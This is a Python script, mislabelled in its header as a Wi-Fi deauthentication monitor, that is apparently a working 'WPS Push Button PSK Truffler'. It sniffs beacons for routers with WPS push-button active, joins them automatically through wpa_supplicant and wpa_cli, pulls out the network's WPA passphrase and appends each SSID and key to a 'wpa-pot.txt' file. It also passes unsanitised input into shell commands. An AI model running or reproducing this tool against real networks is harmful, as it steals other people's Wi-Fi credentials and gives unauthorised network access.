#!/usr/bin/python

# Wifi Deauthentication & Disassociation monitor

import signal
import sys
import os
import optparse
import datetime
import time
import threading
import os.path

from scapy.all import *

# Set any global vars
probe_req = []


# Define subs
# -----------

# Close cleanly on Ctrl+C
def signal_handler(sig, frame):
   print '\nYou pressed Ctrl+C! Exiting...\n'
   os.system('touch dummy.exit')
   os.system("ifconfig " + options.interface + " down ; ifconfig " + options.interface + " up >/dev/null 2>&1")
   sys.exit(0)


# Print at location on screen
def print_at(x, y, text):
   sys.stdout.write("\x1b7\x1b[%d;%df%s\x1b8" % (y, x, text))
   sys.stdout.flush()


# Channel Hopper
def channel_hopper(wifi_interface):
   while not os.path.isfile('dummy.exit'):
      for channel in range(1, 13):
         if not os.path.isfile('wps-pbc.conf'):
            os.system('iwconfig ' + wifi_interface + ' channel ' + str(channel))
            print_at( 1, 4, ('Channel   : ' + str(channel) + '  '))
         time.sleep(0.5)
   print "Exiting thread..."


#Converts an array of bytes ('\x01\x02\x03...') to an integer value
def strToInt(string):
   intval = 0
   shift = (len(string)-1) * 8;

   for byte in string:
      try:
         intval += int(ord(byte))<<shift
         shift -= 8
      except Exception,e:
         print 'Caught exception converting string to int:',e
         return False
   return intval


#Parse a particular ELT layer from a packet looking for WPS info
def getWPSinfo(elt, essid):
   data = None
   minSize = offset = 4
   typeSize = versionSize = 2

   #ELTs must be this high to ride!
   if elt.len > minSize:
      #Loop through the entire ELT
      while offset < elt.len:
         try:
            #Get the ELT type code
            eltType = strToInt(elt.info[offset:offset+typeSize])
            offset += typeSize
            #Get the ELT data length
            eltLen = strToInt(elt.info[offset:offset+versionSize])
            offset += versionSize
            #Pull this ELT's data out
            data = elt.info[offset:offset+eltLen]
            data = strToInt(data)
         except:
            return False

         # Check for WPS PBC tag?
         if eltType == 0x1012:
            # Found WPS Push Button?
            if data == 4:
               # NOT ACTIVE - but can be used to just attack unique SSID's only once
               if essid not in probe_req:
                  print "\nWPS Pusbutton active! Time to TRUFFLE! This may take a few minutes, please be patient..."
                  #os.system('xterm -e ./wps_pbc-truffle.sh ' + wifi_interface + ' ' + essid)

                  # Prep for WPA PSK Truffle...
                  os.system('killall wpa_supplicant > /dev/null 2>&1')
                  os.system('rm /var/run/wpa_supplicant/' + wifi_interface + ' > /dev/null 2>&1')
                  os.system('cp wps-pbc.conf-master wps-pbc.conf')

                  # Start WPA PSK Truffle process
                  os.system('wpa_supplicant -t -Dwext -i ' + wifi_interface + ' -c ./wps-pbc.conf -B > /dev/null 2>&1')
                  time.sleep(1)
                  os.system('wpa_cli -i ' + wifi_interface + ' wps_pbc > /dev/null')
                  os.system('iwconfig ' + wifi_interface + ' essid ' + essid)
                  os.system('dhclient ' + wifi_interface + '  >/dev/null 2>&1')

                  # Update WPA supplicant config and save
                  os.system('wpa_cli set update_config 1 > /dev/null')
                  os.system('wpa_cli save_config > /dev/null')

                  # Put SSID and PSK into WPA Pot
                  os.system('echo ' + essid + ' >> wpa-pot.txt')
                  os.system('cat wps-pbc.conf | tr -d "[:blank:]" | grep psk | sed s/psk=//g | cut -c 2- | rev | cut -c 2- | rev >> wpa-pot.txt')

                  # Reset wifi interface IP
                  os.system('ifconfig ' + wifi_interface + '  0.0.0.0')

                  # Clear wpa_cli and reset wifi interface
                  os.system('wpa_cli -i ' + wifi_interface + '  terminate > /dev/null')
                  os.system('(airodump-ng -i ' + wifi_interface + ' -c 1 > /dev/null 2>&1 &)')
                  time.sleep(5)
                  os.system('(killall airodump-ng)')
                  os.system('rfkill unblock all > /dev/null')
                  os.system('airmon-ng check kill > /dev/null')
                  time.sleep(2)
                  os.system('mv wps-pbc.conf wps-pbc.bak > /dev/null')

                  # Printout SSID & PSK
                  print "SSID:", essid
                  os.system('echo PSK : `cat wps-pbc.bak | tr -d "[:blank:]" | grep psk | sed s/psk=//g | cut -c 2- | rev | cut -c 2- | rev`')

                  # Add SSID if using unique once only attack
                  #probe_req.append(essid)

                  time.sleep(5)
                  return 1

         offset += eltLen


# Wifi sniffing routine
def wifisniff(pk):
   # Check if the packet is a 802.11 beacon with an ELT layer
   if pk.haslayer(Dot11Beacon) and pk.haslayer(Dot11Elt):
      bssid = pk[Dot11].addr3.upper()

      pkt = pk
      WPSPBC = 0

      # Loop through all of the ELT layers in the packet
      while Dot11Elt in pkt:
         pkt = pkt[Dot11Elt]

         # Check for Vendor packet
         if pkt.ID == 221:
            getWPSinfo(pkt, pk.info)

         pkt = pkt.payload



# Main Code
# ---------

# Ensure wifi reg is set to GB
os.system("iw reg set GB")

# Get command line inputs
parser = optparse.OptionParser("\nusage ./wps_pbc-truffle.py " + "-i <interface>\n")
parser.add_option('-i', dest='interface', type='string', help='specify minitor interface, i.e. wlan0mon')


(options, args) = parser.parse_args()

if (options.interface == None):
   print parser.usage
   exit(0)

# Set wifi interface
wifi_interface = options.interface

# Clear or setup any vars
os.system('rm dummy.exit')

# Clear wifi for channel hopping
os.system('(airodump-ng -i ' + wifi_interface + ' -c 1 > /dev/null 2>&1 &)')
time.sleep(2)
os.system('(killall airodump-ng)')

# Wifi Sniffing
os.system('clear')
print "WPS Push Button PSK Truffler"
print "============================"
#print "ESSID     : " + options.essid
#print "BSSID     : " + ap_bssid
#print "Channel   : " + ap_channel
print "Interface : " + wifi_interface

# Hard code non jammed MAC!
#print "\n\nIntiating non-jam MAC..."
#os.system('ifconfig ' + wifi_interface + ' down')
#os.system('macchanger -m 00:00:00:00:00:01 ' + wifi_interface)
#os.system('ifconfig ' + wifi_interface + ' up')

time.sleep(1)

# Start Ctrl+C signal handler
signal.signal(signal.SIGINT, signal_handler)

# Start channel hopping thread
thread = threading.Thread(target=channel_hopper, args=(wifi_interface, ), name='channel_hopper')
thread.daemon = True
thread.start()

# Start sniffing with looping on exception
while not os.path.isfile('dummy.exit'):
   while not os.path.isfile('dummy.exit'):
      try:
         sniff(iface=wifi_interface, prn=wifisniff, store=0)
      except:
         continue


